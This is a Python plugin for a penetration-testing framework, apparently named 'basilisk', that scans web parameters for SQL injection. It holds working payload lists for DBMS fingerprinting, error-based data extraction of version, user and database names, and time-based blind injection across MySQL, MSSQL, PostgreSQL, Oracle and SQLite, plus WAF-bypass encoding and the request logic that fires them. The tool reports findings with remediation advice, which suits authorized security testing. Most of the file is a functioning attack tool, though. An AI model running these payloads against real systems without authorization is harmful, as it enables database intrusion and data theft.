"""Advanced SQL injection — WAF bypass, DBMS fingerprinting, multi-technique attack.

Integrates with ctx.waf_bypass for adaptive encoding and ctx.payloads for
centralized payload selection. Attack order: error-based → UNION → time-based → boolean blind.
"""

from __future__ import annotations

import logging
import re
import time
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.payloads import DbmsType

logger = logging.getLogger(__name__)

# DBMS fingerprint probes: (payload_suffix, response_regex, dbms)
DBMS_PROBES: list[tuple[str, str, DbmsType]] = [
    ("AND 1=CONVERT(int,@@version)--", r"Microsoft|SQL Server", DbmsType.MSSQL),
    ("AND 1=1/@@version--", r"Microsoft|SQL Server", DbmsType.MSSQL),
    (
        "AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        r"XPATH syntax|MySQL|MariaDB",
        DbmsType.MYSQL,
    ),
    ("AND 1=CAST(version() AS int)--", r"PostgreSQL|ERROR.*integer", DbmsType.POSTGRES),
    (
        "AND 1=UTL_INADDR.GET_HOST_NAME("
        "(SELECT banner FROM v$version WHERE ROWNUM=1))--",
        r"ORA-\d+|Oracle",
        DbmsType.ORACLE,
    ),
    (
        "AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000))))--",
        r"database.*locked|SQLITE",
        DbmsType.SQLITE,
    ),
]

# Error patterns indicating SQL injection
SQL_ERROR_PATTERNS: list[re.Pattern] = [
    re.compile(r"SQL syntax.*MySQL|MariaDB", re.IGNORECASE),
    re.compile(r"Warning.*\Wmysqli?_", re.IGNORECASE),
    re.compile(r"PostgreSQL.*ERROR|ERROR.*PostgreSQL", re.IGNORECASE),
    re.compile(r"Microsoft.*ODBC|SQL Server|OLE DB", re.IGNORECASE),
    re.compile(r"ORA-\d{5}", re.IGNORECASE),
    re.compile(r"SQLite.*error|SQLITE_ERROR", re.IGNORECASE),
    re.compile(r"Unclosed quotation|Unterminated string", re.IGNORECASE),
    re.compile(r"quoted string not properly terminated", re.IGNORECASE),
    re.compile(r"syntax error.*near|at or near", re.IGNORECASE),
    re.compile(r"SQLSTATE\[", re.IGNORECASE),
    re.compile(r"java\.sql\.SQLException", re.IGNORECASE),
    re.compile(r"expects parameter|division by zero", re.IGNORECASE),
]

# Time-based payloads per DBMS
TIME_PAYLOADS: dict[DbmsType, list[str]] = {
    DbmsType.MYSQL: [
        "' AND SLEEP({delay})-- ",
        "' AND (SELECT * FROM (SELECT SLEEP({delay}))a)-- ",
        "' OR SLEEP({delay})-- ",
        "1' AND BENCHMARK(5000000,SHA1('test'))-- ",
    ],
    DbmsType.MSSQL: [
        "'; WAITFOR DELAY '0:0:{delay}'-- ",
        "' AND 1=1; WAITFOR DELAY '0:0:{delay}'-- ",
    ],
    DbmsType.POSTGRES: [
        "'; SELECT pg_sleep({delay})-- ",
        "' AND 1=(SELECT 1 FROM pg_sleep({delay}))-- ",
    ],
    DbmsType.ORACLE: [
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- ",
    ],
    DbmsType.SQLITE: [
        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- ",
    ],
    DbmsType.GENERIC: [
        "' AND SLEEP({delay})-- ",
        "'; WAITFOR DELAY '0:0:{delay}'-- ",
        "' AND 1=(SELECT 1 FROM pg_sleep({delay}))-- ",
    ],
}

# Error-based extraction payloads per DBMS
ERROR_EXTRACT: dict[DbmsType, list[str]] = {
    DbmsType.MYSQL: [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- ",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- ",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),"
        "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
    ],
    DbmsType.MSSQL: [
        "' AND 1=CONVERT(int,(SELECT @@version))-- ",
        "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- ",
        "' AND 1=CONVERT(int,(SELECT SYSTEM_USER))-- ",
    ],
    DbmsType.POSTGRES: [
        "' AND 1=CAST((SELECT version()) AS int)-- ",
        "' AND 1=CAST((SELECT current_user) AS int)-- ",
        "' AND 1=CAST((SELECT current_database()) AS int)-- ",
    ],
    DbmsType.ORACLE: [
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- ",
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- ",
    ],
    DbmsType.SQLITE: [
        "' AND 1=CAST((SELECT sqlite_version()) AS int)-- ",
    ],
    DbmsType.GENERIC: [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- ",
        "' AND 1=CONVERT(int,(SELECT @@version))-- ",
        "' AND 1=CAST((SELECT version()) AS int)-- ",
    ],
}

SQLI_PARAMS = [
    "id", "page", "cat", "q", "search", "item", "product", "user", "order", "sort",
]


class SqliAdvancedPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="sqli_advanced",
        display_name="Advanced SQL Injection",
        category=PluginCategory.PENTESTING,
        description=(
            "Multi-technique SQLi scanner: error-based, UNION, time-based blind, "
            "boolean blind. WAF-adaptive encoding, DBMS fingerprinting."
        ),
        depends_on=["http_headers"],
        produces=["sqli_results"],
        timeout=120.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        data: dict = {"tested_params": [], "dbms": None, "waf": None}

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data=data,
            )

        # Check WAF from pipeline
        waf_engine = ctx.waf_bypass
        if waf_engine:
            waf_engine.set_waf_from_pipeline(target.host, ctx.pipeline)
            if waf_engine.waf_detected:
                data["waf"] = waf_engine.waf_name

        # Gather (path, param) pairs from crawled data or use defaults
        param_pairs = self._get_params_and_paths(target.host, ctx)
        self._scan_base = base_url

        # Phase 1: Error-based detection + DBMS fingerprinting
        detected_dbms = DbmsType.GENERIC
        for path, param in param_pairs:
            if ctx.should_stop:
                break
            dbms = await self._fingerprint_dbms(ctx, base_url, path, param, waf_engine)
            if dbms != DbmsType.GENERIC:
                detected_dbms = dbms
                data["dbms"] = dbms.value
                findings.append(Finding.info(
                    f"DBMS fingerprinted: {dbms.value} (param: {param})",
                    evidence=(
                        f"Parameter '{param}' on {path} "
                        f"revealed DBMS type: {dbms.value}"
                    ),
                    tags=["pentesting", "sqli", "fingerprint"],
                ))
                break

        # Phase 2: Error-based extraction
        for path, param in param_pairs[:5]:
            if ctx.should_stop:
                break
            ef = await self._test_error_based(
                ctx, base_url, path, param, detected_dbms, waf_engine,
            )
            if ef:
                findings.append(ef)
                break

        # Phase 3: Time-based blind
        for path, param in param_pairs[:5]:
            if ctx.should_stop or len(findings) >= 3:
                break
            tf = await self._test_time_based(
                ctx, base_url, path, param, detected_dbms, waf_engine,
            )
            if tf:
                findings.append(tf)
                break

        data["tested_params"] = [p for _, p in param_pairs]

        if not findings:
            findings.append(Finding.info(
                "No SQL injection detected",
                tags=["pentesting", "sqli"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data=data,
        )

    def _get_params_and_paths(
        self, host: str, ctx,
    ) -> list[tuple[str, str]]:
        """Get (path, param) pairs from crawled data or defaults."""
        from basilisk.utils.injection_points import collect_injection_points

        inj_points = collect_injection_points(
            host, ctx,
            hardcoded_paths=["/"],
            hardcoded_params=SQLI_PARAMS,
            param_filter=SQLI_PARAMS,
            max_points=20,
        )
        pairs: list[tuple[str, str]] = []
        for point in inj_points:
            for param in point.params:
                pairs.append((point.path, param))
        if not pairs:
            return [("/", p) for p in SQLI_PARAMS]
        return pairs

    async def _fingerprint_dbms(
        self, ctx, base_url: str, path: str, param: str, waf_engine,
    ) -> DbmsType:
        """Send diagnostic probes to identify DBMS from error messages."""
        for probe_suffix, pattern, dbms in DBMS_PROBES:
            if ctx.should_stop:
                break
            payloads = [f"1 {probe_suffix}"]
            if waf_engine and waf_engine.waf_detected:
                payloads = waf_engine.encode(payloads[0], "sqli")[:3]

            for payload in payloads:
                try:
                    async with ctx.rate:
                        url = f"{base_url}{path}?{param}={payload}"
                        resp = await ctx.http.get(url, timeout=8.0)
                        body = await resp.text(encoding="utf-8", errors="replace")
                        if re.search(pattern, body, re.IGNORECASE):
                            return dbms
                except Exception as e:
                    logger.debug("sqli_advanced: %s", e)
                    continue
        return DbmsType.GENERIC

    async def _test_error_based(
        self, ctx, base_url: str, path: str, param: str, dbms: DbmsType, waf_engine,
    ) -> Finding | None:
        """Test error-based SQL injection with extraction."""
        payloads = ERROR_EXTRACT.get(dbms, ERROR_EXTRACT[DbmsType.GENERIC])
        for raw_payload in payloads:
            if ctx.should_stop:
                break
            test_payloads = [raw_payload]
            if waf_engine and waf_engine.waf_detected:
                test_payloads = waf_engine.encode(raw_payload, "sqli")[:3]

            for payload in test_payloads:
                try:
                    async with ctx.rate:
                        url = f"{base_url}{path}?{param}={payload}"
                        resp = await ctx.http.get(url, timeout=8.0)
                        body = await resp.text(encoding="utf-8", errors="replace")
                        # Check for data leakage markers (0x7e = ~)
                        extracted = re.search(r"~([^~]+)~", body)
                        if extracted:
                            return Finding.critical(
                                f"Error-based SQLi: data extracted via {param}",
                                description=(
                                    f"Error-based SQL injection on parameter '{param}' "
                                    f"allowed data extraction. DBMS: {dbms.value}"
                                ),
                                evidence=(
                                    f"Parameter: {param}\n"
                                    f"Extracted: {extracted.group(1)[:100]}\n"
                                    f"DBMS: {dbms.value}\n"
                                    f"Payload: {raw_payload[:80]}"
                                ),
                                remediation=(
                                    "Use parameterized queries / prepared statements. "
                                    "Never concatenate user input into SQL."
                                ),
                                confidence=0.95,
                                verified=True,
                                tags=["pentesting", "sqli", "error-based", dbms.value],
                            )
                        # Also check for standard SQL errors
                        for pat in SQL_ERROR_PATTERNS:
                            if pat.search(body):
                                return Finding.high(
                                    f"SQL error triggered via {param}",
                                    description=(
                                        f"SQL error message detected on parameter "
                                        f"'{param}'. "
                                        f"Indicates SQL injection vulnerability."
                                    ),
                                    evidence=(
                                        f"Parameter: {param}\n"
                                        f"Error pattern: {pat.pattern[:60]}\n"
                                        f"DBMS: {dbms.value}\n"
                                        f"Payload: {raw_payload[:80]}"
                                    ),
                                    remediation="Use parameterized queries.",
                                    confidence=0.8,
                                    tags=["pentesting", "sqli", "error-based"],
                                )
                except Exception as e:
                    logger.debug("sqli_advanced: %s", e)
                    continue
        return None

    async def _test_time_based(
        self, ctx, base_url: str, path: str, param: str, dbms: DbmsType, waf_engine,
    ) -> Finding | None:
        """Test time-based blind SQL injection."""
        delay = 5
        payloads = TIME_PAYLOADS.get(dbms, TIME_PAYLOADS[DbmsType.GENERIC])

        # First, establish baseline timing
        try:
            async with ctx.rate:
                start = time.monotonic()
                await ctx.http.get(f"{base_url}{path}?{param}=1", timeout=15.0)
                baseline = time.monotonic() - start
        except Exception:
            baseline = 1.0

        for raw_payload in payloads:
            if ctx.should_stop:
                break
            formatted = raw_payload.format(delay=delay)
            test_payloads = [formatted]
            if waf_engine and waf_engine.waf_detected:
                test_payloads = waf_engine.encode(formatted, "sqli")[:3]

            for payload in test_payloads:
                try:
                    async with ctx.rate:
                        url = f"{base_url}{path}?{param}={payload}"
                        start = time.monotonic()
                        await ctx.http.get(url, timeout=delay + 10.0)
                        elapsed = time.monotonic() - start

                    if elapsed >= baseline + delay - 1:
                        # Confirm with second request
                        async with ctx.rate:
                            start2 = time.monotonic()
                            await ctx.http.get(url, timeout=delay + 10.0)
                            elapsed2 = time.monotonic() - start2

                        if elapsed2 >= baseline + delay - 1:
                            return Finding.critical(
                                f"Time-based blind SQLi confirmed: {param}",
                                description=(
                                    f"Time-based blind SQL injection on parameter "
                                    f"'{param}'. Injected {delay}s delay confirmed "
                                    f"twice. DBMS: {dbms.value}"
                                ),
                                evidence=(
                                    f"Parameter: {param}\n"
                                    f"Baseline: {baseline:.1f}s\n"
                                    f"Delay 1: {elapsed:.1f}s\n"
                                    f"Delay 2: {elapsed2:.1f}s\n"
                                    f"Expected delay: {delay}s\n"
                                    f"DBMS: {dbms.value}\n"
                                    f"Payload: {raw_payload[:80]}"
                                ),
                                remediation="Use parameterized queries.",
                                confidence=0.9,
                                verified=True,
                                tags=[
                                    "pentesting", "sqli", "time-blind",
                                    dbms.value,
                                ],
                            )
                except Exception as e:
                    logger.debug("sqli_advanced: %s", e)
                    continue
        return None
